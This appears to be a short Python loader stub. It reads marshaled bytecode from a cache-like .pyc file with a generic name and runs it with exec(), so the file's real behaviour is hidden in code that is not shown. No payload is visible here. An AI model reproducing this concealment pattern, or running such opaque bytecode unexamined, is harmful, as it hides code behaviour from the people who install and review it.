
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'dataclass_5256c3fbbecd4e80bab90f03602d3ec6.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
